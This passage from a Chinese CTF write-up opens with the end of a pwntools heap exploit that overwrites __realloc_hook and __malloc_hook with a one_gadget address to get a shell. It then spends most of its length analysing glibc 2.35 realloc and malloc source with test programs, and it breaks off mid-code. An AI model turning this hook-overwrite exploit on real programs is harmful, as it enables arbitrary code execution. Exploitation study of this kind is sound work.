class="line">edit_card(12,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(1,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(8,0,100,&quot;a&quot;)</span><br><span class="line">edit_card(1,0,100,&quot;a&quot;)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">realloc_hook = libc_addr + libc.sym[&#x27;__realloc_hook&#x27;]</span><br><span class="line">onegadget_addr = libc_addr + 0x10a38c</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)</span><br><span class="line">edit_card(8,0,100,p64(realloc_hook-0x10))</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0xC1A)&#x27;)</span><br><span class="line">init_card()</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)</span><br><span class="line">realloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]</span><br><span class="line">edit_card(8,0,100,p64(0)*2+p64(onegadget_addr)+p64(realloc_addr+0x6))</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0xC1A)&#x27;)</span><br><span class="line">init_card()</span><br><span class="line"># pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="后记-realloc详解"><a href="#后记-realloc详解" class="headerlink" title="后记 realloc详解"></a>后记 realloc详解</h2><p>专门研究了一下realloc 发现还有平时不知道的很多用法<br>realloc函数主要用于重新分配内存空间 可以调整已分配的内存空间</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void *realloc(void *ptr, size_t size)</span><br></pre></td></tr></table></figure><p>ptr指向需要重分配的chunk指针  size表示的需要分配的大小<br>来看看正常情况下的realloc如何运作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//gcc -o test -g ./test.c</span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout, 0, 0, 0);</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    init();</span><br><span class="line">    char *ptr = malloc(0x30);</span><br><span class="line">    realloc(ptr,0x10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行realloc之前的ptr如下图所示<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844118.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844118.png" alt="image.png"></a><br>执行之后 原先的chunk就重新分配成了0x20 剩下的0x20被释放进入bin中<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844369.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251844369.png" alt="image.png"></a><br>这里注意的是 虽然重分配的大小是0x10 按理来说0x30的chunk分配掉0x10 那剩余的实际大小应该是0x20 但是最终两个chunk的实际大小都是0x10 是为了考虑到不破坏原有的堆结构<br>此时如果把realloc函数的ptr参数修改为0 来看看会是什么效果<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251847647.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251847647.png" alt="image.png"></a><br>由于没有需要重分配的chunk 所以这里直接申请了一个新的chunk<br>如果把realloc函数的size参数修改为0<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251848504.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251848504.png" alt="image.png"></a><br>则会直接把chunk释放进入bin中<br>如果size的大小大于chunk原本的大小呢<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251850489.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251850489.png" alt="image.png"></a><br>则会直接扩大chunk的size<br>如果chunk1后面再跟一个chunk2来固定大小呢 这个时候chunk1没法直接向高地址扩大<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251853597.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251853597.png" alt="image.png"></a><br>可以看到取而代之的办法就是直接释放chunk1 然后重新申请一个满足size的chunk</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//gcc -o test -g ./test.c</span><br><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void init()&#123;</span><br><span class="line">    setvbuf(stdout, 0, 0, 0);</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    init();</span><br><span class="line">    char *ptr = malloc(0x30);</span><br><span class="line">    char *ptr1 = malloc(0x30);</span><br><span class="line">    char *ptr2 = malloc(0x10);</span><br><span class="line">    free(ptr1);</span><br><span class="line">    realloc(ptr,0x30);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里猜测realloc重分配的逻辑是先释放再申请 这里先释放一个0x30大小的chunk 再进行realloc 看看重新分配后的指针是指向哪一个chunk<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901023.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901023.png" alt="image.png"></a><br>依然指向的是chunk0<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901049.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251901049.png" alt="image.png"></a><br>和设想的有点不一样 这里去查看下realloc的注释<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251910145.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411251910145.png" alt="image.png"></a><br>按照源码所说 当重分配的size大于原有的size时 会采用malloc-copy-free的操作序列 也就是先申请满足大小的chunk 再转移数据 最后释放原来的chunk<br>但是上面我们已经实验过 当tcachebin中存在满足大小的chunk时 他也不会去申请<br>哪怕把tcachebin换成unsortedbin也是同理<br>那还是得根据realloc的源代码来查看一下详细的逻辑<br>(以下源码版本为glibc2.35 中文注释为我所记)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void *</span><br><span class="line">__libc_realloc (void *oldmem, size_t bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  INTERNAL_SIZE_T nb;         /* padded request size */</span><br><span class="line"></span><br><span class="line">  void *newp;             /* chunk to return */</span><br><span class="line"></span><br><span class="line">  if (!__malloc_initialized)   //检测堆是否初始化</span><br><span class="line">    ptmalloc_init ();</span><br><span class="line"></span><br><span class="line">#if REALLOC_ZERO_BYTES_FREES  //这个的值默认为1 当bytes为0且指针不为空时 realloc相当于free函数</span><br><span class="line">  if (bytes == 0 &amp;&amp; oldmem != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); return 0;</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  /* realloc of null is supposed to be same as malloc */</span><br><span class="line">  if (oldmem == 0)   //当指针为空时 realloc相当于malloc函数</span><br><span class="line">    return __libc_malloc (bytes);</span><br><span class="line"></span><br><span class="line">  /* Perform a quick check to ensure that the pointer&#x27;s tag matches the</span><br><span class="line">     memory&#x27;s tag.  */</span><br><span class="line">  if (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    *(volatile char*) oldmem;</span><br><span class="line"></span><br><span class="line">  /* chunk corresponding to oldmem */   //获取内存块指针以及内存块大小</span><br><span class="line">  const mchunkptr oldp = mem2chunk (oldmem);</span><br><span class="line">  /* its size */</span><br><span class="line">  const INTERNAL_SIZE_T oldsize = chunksize (oldp);</span><br><span class="line"></span><br><span class="line">  if (chunk_is_mmapped (oldp))  //检测是否通过mmap方式分配的内存  malloc函数申请的内存空间是由brk得到的</span><br><span class="line">    ar_ptr = NULL;</span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      MAYBE_INIT_TCACHE ();</span><br><span class="line">      ar_ptr = arena_for_chunk (oldp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* Little security check which won&#x27;t hurt performance: the allocator</span><br><span class="line">     never wrapps around at the end of the address space.  Therefore</span><br><span class="line">     we can exclude some size values which might appear here by</span><br><span class="line">     accident or by &quot;design&quot; from some intruder.  */</span><br><span class="line">  if ((__builtin_expect ((uintptr_t) oldp &gt; (uintptr_t) -oldsize, 0)   //检查内存块大小是否小于零以及指针是否对齐</span><br><span class="line">       || __builtin_expect (misaligned_chunk (oldp), 0)))</span><br><span class="line">      malloc_printerr (&quot;realloc(): invalid pointer&quot;);</span><br><span class="line"></span><br><span class="line">  if (!checked_request2size (bytes, &amp;nb))   //检查申请的bytes大小</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (chunk_is_mmapped (oldp))</span><br><span class="line">    &#123;</span><br><span class="line">      void *newmem;</span><br><span class="line"></span><br><span class="line">#if HAVE_MREMAP  //默认为0 作用是为1时让realloc使用mremap来重分配大chunk</span><br><span class="line">      newp = mremap_chunk (oldp, nb);</span><br><span class="line">      if (newp)</span><br><span class="line">    &#123;</span><br><span class="line">      void *newmem = chunk2mem_tag (newp);</span><br><span class="line">      /* Give the new block a different tag.  This helps to ensure</span><br><span class="line">         that stale handles to the previous mapping are not</span><br><span class="line">         reused.  There&#x27;s a performance hit for both us and the</span><br><span class="line">         caller for doing this, so we might want to</span><br><span class="line">         reconsider.  */</span><br><span class="line">      return tag_new_usable (newmem);</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line">      /* Note the extra SIZE_SZ overhead. */</span><br><span class="line">      if (oldsize - SIZE_SZ &gt;= nb)   //SIZE_SZ表示chunk的元数据 如果chunk大小大于bytes 就直接返回chunk指针</span><br><span class="line">        return oldmem;                         /* do nothing */</span><br><span class="line"></span><br><span class="line">      /* Must alloc, copy, free. */</span><br><span class="line">      newmem = __libc_malloc (bytes); //这里就是比较关键的逻辑了 如果原有的chunk空间不够重分配 那么就调用malloc(bytes) 然后把旧chunk的内容copy到新chunk</span><br><span class="line">      if (newmem == 0)</span><br><span class="line">        return 0;              /* propagate failure */</span><br><span class="line"></span><br><span class="line">      memcpy (newmem, oldmem, oldsize - CHUNK_HDR_SZ);</span><br><span class="line">      munmap_chunk (oldp);  //释放旧chunk</span><br><span class="line">      return newmem;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (SINGLE_THREAD_P)  //单线程情况下的重分配</span><br><span class="line">    &#123;</span><br><span class="line">      newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line">      assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line"></span><br><span class="line">      return newp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  //多线程</span><br><span class="line">  __libc_lock_lock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line">  </span><br><span class="line">  //内存分配失败时的异常处理</span><br><span class="line">  if (newp == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Try harder to allocate memory in other arenas.  */</span><br><span class="line">      LIBC_PROBE (memory_realloc_retry, 2, bytes, oldmem);</span><br><span class="line">      newp = __libc_malloc (bytes);</span><br><span class="line">      if (newp != NULL)</span><br><span class="line">        &#123;</span><br><span class="line">      size_t sz = memsize (oldp);</span><br><span class="line">      memcpy (newp, oldmem, sz);</span><br><span class="line">      (void) tag_region (chunk2mem (oldp), sz);</span><br><span class="line">          _int_free (ar_ptr, oldp, 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  return newp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点关注的部分就是malloc-copy-free这个流程了 当oldp的size不满足bytes的时候 就会触发 但是我们之前的实验却没有成功 不过因为libc_realloc函数中的mcf流程只存在于if (chunk_is_mmapped (oldp))这个分支中 需要chunk由mmap分配的才行 所以接下来需要接着分析int_realloc函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_int_realloc (mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize,</span><br><span class="line">         INTERNAL_SIZE_T nb)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr        newp;            /* chunk to return */</span><br><span class="line">  INTERNAL_SIZE_T  newsize;         /* its size */</span><br><span class="line">  void*          newmem;          /* corresponding user mem */</span><br><span class="line"></span><br><span class="line">  mchunkptr        next;            /* next contiguous chunk after oldp */</span><br><span class="line"></span><br><span class="line">  mchunkptr        remainder;       /* extra space at end of newp */</span><br><span class="line">  unsigned long    remainder_size;  /* its size */</span><br><span class="line"></span><br><span class="line">  /* oldmem size */</span><br><span class="line">  if (__builtin_expect (chunksize_nomask (oldp) &lt;= CHUNK_HDR_SZ, 0)  //检查oldp的大小是否小于等于chunk头大小 如果小于等于 那么oldp明显不正常</span><br><span class="line">      || __builtin_expect (oldsize &gt;= av-&gt;system_mem, 0))  //检查oldsize是否大于等于系统内存总量</span><br><span class="line">    malloc_printerr (&quot;realloc(): invalid old size&quot;);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk (av, oldp);  //检查oldp指向的内存块是否处于使用中</span><br><span class="line"></span><br><span class="line">  /* All callers already filter out mmap&#x27;ed chunks.  */</span><br><span class="line">  assert (!chunk_is_mmapped (oldp));   //前面已经处理干净了mmap分配的内存块 这里检查一下</span><br><span class="line"></span><br><span class="line">  next = chunk_at_offset (oldp, oldsize);  //获取下一个内存块</span><br><span class="line">  INTERNAL_SIZE_T nextsize = chunksize (next);  //获取下一个内存块的大小</span><br><span class="line">  if (__builtin_expect (chunksize_nomask (next) &lt;= CHUNK_HDR_SZ, 0)  //检查下一个内存块的大小是否小于等于chunk头大小</span><br><span class="line">      || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))  //检查下一个内存块的大小是否大于等于系统内存总量</span><br><span class="line">    malloc_printerr (&quot;realloc(): invalid next size&quot;);</span><br><span class="line"></span><br><span class="line">  if ((unsigned long) (oldsize) &gt;= (unsigned long) (nb))  //检查oldsize是否大于等于nb</span><br><span class="line">    &#123;</span><br><span class="line">      /* already big enough; split below */</span><br><span class="line">      newp = oldp;       //如果oldsize大于重分配的size 就不重新申请chunk 而是切割oldp</span><br><span class="line">      newsize = oldsize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      /* Try to expand forward into top */</span><br><span class="line">      if (next == av-&gt;top &amp;&amp;    //如果下一个chunk是top chunk 就扩展oldp</span><br><span class="line">          (unsigned long) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">          (unsigned long) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          set_head_size (oldp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">          av-&gt;top = chunk_at_offset (oldp, nb);</span><br><span class="line">          set_head (av-&gt;top, (newsize - nb) | PREV_INUSE);</span><br><span class="line">          check_inuse_chunk (av, oldp);</span><br><span class="line">          return tag_new_usable (chunk2mem (oldp));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /* Try to expand forward into next chunk;  split off remainder below */</span><br><span class="line">      else if (next != av-&gt;top &amp;&amp;   //如果下一个chunk(free状态)的大小和oldpsize加起来大于等于nb 就合并oldp和nextchunk 然后重分配</span><br><span class="line">               !inuse (next) &amp;&amp;</span><br><span class="line">               (unsigned long) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">               (unsigned long) (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          newp = oldp;</span><br><span class="line">          unlink_chunk (av, next);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /* allocate, copy, free */</span><br><span class="line">      else  //如果上述的特殊情况都不满足 就按照malloc-copy-free的流程来</span><br><span class="line">        &#123;</span><br><span class="line">          newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);</span><br><span class="line">          if (newmem == 0)</span><br><span class="line">            return 0; /* propagate failure */</span><br><span class="line"></span><br><span class="line">          newp = mem2chunk (newmem);</span><br><span class="line">          newsize = chunksize (newp);</span><br><span class="line"></span><br><span class="line">          /*</span><br><span class="line">             Avoid copy if newp is next chunk after oldp.</span><br><span class="line">           */</span><br><span class="line">          if (newp == next)  //这里比较疑惑 用于检测newp是不是next chunk 如果是的话就按照合并oldp和next chunk算 但是正常来说 前面已经处理过这种情况了</span><br><span class="line">            &#123;</span><br><span class="line">              newsize += oldsize;</span><br><span class="line">              newp = oldp;</span><br><span class="line">            &#125;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">          void *oldmem = chunk2mem (oldp);</span><br><span class="line">          size_t sz = memsize (oldp);</span><br><span class="line">          (void) tag_region (oldmem, sz);  //标记旧内存区域</span><br><span class="line">          newmem = tag_new_usable (newmem);  //标记新内存区域可用</span><br><span class="line">          memcpy (newmem, oldmem, sz);</span><br><span class="line">          _int_free (av, oldp, 1); </span><br><span class="line">          check_inuse_chunk (av, newp); </span><br><span class="line">          return newmem; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* If possible, free extra space in old or extended chunk */</span><br><span class="line"></span><br><span class="line">  assert ((unsigned long) (newsize) &gt;= (unsigned long) (nb));  //判断重分配后的chunk大小是否大于需要分配的大小 即检测是否有多余的空间</span><br><span class="line"></span><br><span class="line">  remainder_size = newsize - nb;</span><br><span class="line"></span><br><span class="line">  if (remainder_size &lt; MINSIZE)   /* not enough extra to split off */</span><br><span class="line">    &#123;   //如果剩余的空间小于最小的chunk大小 那么就设置一些chunk的基础信息然后返回</span><br><span class="line">      set_head_size (newp, newsize | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">      set_inuse_bit_at_offset (newp, newsize);</span><br><span class="line">    &#125;</span><br><span class="line">  else   /* split remainder */</span><br><span class="line">    &#123;  //相反 如果有多余的空间 就切割出来为新的chunk</span><br><span class="line">      remainder = chunk_at_offset (newp, nb);</span><br><span class="line">      /* Clear any user-space tags before writing the header.  */</span><br><span class="line">      remainder = tag_region (remainder, remainder_size);</span><br><span class="line">      set_head_size (newp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">      /* Mark remainder as inuse so free() won&#x27;t complain */</span><br><span class="line">      set_inuse_bit_at_offset (remainder, remainder_size);</span><br><span class="line">      _int_free (av, remainder, 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk (av, newp);</span><br><span class="line">  return tag_new_usable (chunk2mem (newp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>int_realloc的主要逻辑都是通过下面这个if分支来 这里着重来分析一波</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else  //如果上述的特殊情况都不满足 就按照malloc-copy-free的流程来</span><br><span class="line">        &#123;</span><br><span class="line">          newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);</span><br><span class="line">          if (newmem == 0)</span><br><span class="line">            return 0; /* propagate failure */</span><br><span class="line"></span><br><span class="line">          newp = mem2chunk (newmem);</span><br><span class="line">          newsize = chunksize (newp);</span><br><span class="line"></span><br><span class="line">          /*</span><br><span class="line">             Avoid copy if newp is next chunk after oldp.</span><br><span class="line">           */</span><br><span class="line">          if (newp == next)  //这里比较疑惑 用于检测newp是不是next chunk 如果是的话就按照合并oldp和next chunk算 但是正常来说 前面已经处理过这种情况了</span><br><span class="line">            &#123;</span><br><span class="line">              newsize += oldsize;</span><br><span class="line">              newp = oldp;</span><br><span class="line">            &#125;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">          void *oldmem = chunk2mem (oldp);</span><br><span class="line">          size_t sz = memsize (oldp);</span><br><span class="line">          (void) tag_region (oldmem, sz);  //标记旧内存区域</span><br><span class="line">          newmem = tag_new_usable (newmem);  //标记新内存区域可用</span><br><span class="line">          memcpy (newmem, oldmem, sz);</span><br><span class="line">          _int_free (av, oldp, 1); </span><br><span class="line">          check_inuse_chunk (av, newp); </span><br><span class="line">          return newmem; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>开头先调用int_malloc(注意 这里是int_malloc 正如realloc一样 malloc也有int和libc两种形式 一般我们通过程序调用的是libc_malloc 所以就会出现 之前发现的明明tcachebin中有合适的chunk 但是却不会申请到了 具体是哪里的分支绕走了 又如何解决 还需要接着往下分析)<br>接下来进行了一个check 检测new_chunk就是next_chunk 但是在此之前 已经单独对next_chunk是否可以用来扩展old_chunk做了判断 这里的if是为了避免int_malloc后 next_chunk变得可用了 而做的异常处理 不过这是为了防止啥样的特殊情况 我也想象不出来 希望在阅读int_malloc后能够得到结论<br>然后就是标准的copy-free了 由于free在实验过程中没有出现特别显著的问题 所以就先不看int_free的源码了 来看看int_malloc和libc_malloc有什么不同</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void *</span><br><span class="line">_int_malloc (mstate av, size_t bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               /* normalized request size */</span><br><span class="line">  unsigned int idx;                 /* associated bin index */</span><br><span class="line">  mbinptr bin;                      /* associated bin */</span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 /* inspected/selected chunk */</span><br><span class="line">  INTERNAL_SIZE_T size;             /* its size */</span><br><span class="line">  int victim_index;                 /* its bin index */</span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              /* remainder from a split */</span><br><span class="line">  unsigned long remainder_size;     /* its size */</span><br><span class="line"></span><br><span class="line">  unsigned int block;               /* bit map traverser */</span><br><span class="line">  unsigned int bit;                 /* bit map traverser */</span><br><span class="line">  unsigned int map;                 /* current word of binmap */</span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    /* misc temp for linking */</span><br><span class="line">  mchunkptr bck;                    /* misc temp for linking */</span><br><span class="line"></span><br><span class="line">#if USE_TCACHE</span><br><span class="line">  size_t tcache_unsorted_count;        /* count of unsorted chunks processed */</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="line">     overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="line">     to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="line">     size. Also, checked_request2size returns false for request sizes</span><br><span class="line">     that are so large that they wrap around zero when padded and</span><br><span class="line">     aligned.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">  if (!checked_request2size (bytes, &amp;nb))  //将请求的内存大小bytes加上chunk的头部大小</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="line">     mmap.  */</span><br><span class="line">  if (__glibc_unlikely (av == NULL))  //如果没有可用的内存分配区 调用sysmalloc通过mmap分配</span><br><span class="line">    &#123;</span><br><span class="line">      void *p = sysmalloc (nb, av);</span><br><span class="line">      if (p != NULL)</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">      return p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="line">     This code is safe to execute even if av is not yet initialized, so we</span><br><span class="line">     can try it without checking, which saves some time on this fast path.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">#define REMOVE_FB(fb, victim, pp)            \</span><br><span class="line">  do                            \</span><br><span class="line">    &#123;                            \  //从fastbin中取出chunk</span><br><span class="line">      victim = pp;                    \</span><br><span class="line">      if (victim == NULL)                \</span><br><span class="line">    break;\</span><br><span class="line">      pp = REVEAL_PTR (victim-&gt;fd);                                     \</span><br><span class="line">      if (__glibc_unlikely (pp != NULL &amp;&amp; misaligned_chunk (pp)))       \ //安全性检查 判断指针是否为空 是否对齐</span><br><span class="line">    malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected&quot;); \</span><br><span class="line">    &#125;                            \</span><br><span class="line">  while ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \</span><br><span class="line">     != victim);\</span><br><span class="line"></span><br><span class="line">  if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))  //判断请求的大小是否处于fastbin的范围内</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx); //获取fastbin链表头</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      if (victim != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      if (__glibc_unlikely (misaligned_chunk (victim)))</span><br><span class="line">        malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 2&quot;);</span><br><span class="line"></span><br><span class="line">      if (SINGLE_THREAD_P)</span><br><span class="line">        *fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line">      else</span><br><span class="line">        REMOVE_FB (fb, pp, victim); //多线程时从fastbin中取出chunk</span><br><span class="line">      if (__glibc_likely (victim != NULL))  //安全性检查</span><br><span class="line">        &#123;</span><br><span class="line">          size_t victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">          if (__builtin_expect (victim_idx != idx, 0))</span><br><span class="line">        malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">#if USE_TCACHE  //这一部分就是以前学过的tcache stash机制 在fastbin中申请chunk后 如果链表中还有free chunk 就会把这些chunk放到tcachebin中</span><br><span class="line">          /* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="line">         stash them in the tcache.  */</span><br><span class="line">          size_t tc_idx = csize2tidx (nb);</span><br><span class="line">          if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          /* While bin not empty and tcache not full, copy chunks.  */</span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  //如果tcache对应size的链表还有空余 就转移chunk</span><br><span class="line">             &amp;&amp; (tc_victim = *fb) != NULL)</span><br><span class="line">            &#123;</span><br><span class="line">              if (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">            malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 3&quot;);</span><br><span class="line">              if (SINGLE_THREAD_P)</span><br><span class="line">            *fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">              else</span><br><span class="line">            &#123;</span><br><span class="line">              REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">              if (__glibc_unlikely (tc_victim == NULL))</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">              tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="line">     hold one size each, no searching within bins is necessary.</span><br><span class="line">     (For a large request, we need to wait until unsorted chunks are</span><br><span class="line">     processed to find best fit. But for small ones, fits are exact</span><br><span class="line">     anyway, so we can check now, which is faster.)</span><br><span class="line">   */</span><br><span class="line">  //先在smallbin中查询可用chunk 因为smallbin链表类似tcachebin 每个size都有一个链表 查询起来速度快</span><br><span class="line">  if (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);  //获取smallbin的链表头</span><br><span class="line"></span><br><span class="line">      if ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;   //取链表的最后一个chunk的上一个chunk</span><br><span class="line">      if (__glibc_unlikely (bck-&gt;fd != victim))   //安全性检查 如果bck的下一个chunk不是victim 说明链表被破坏</span><br><span class="line">        malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);</span><br><span class="line">          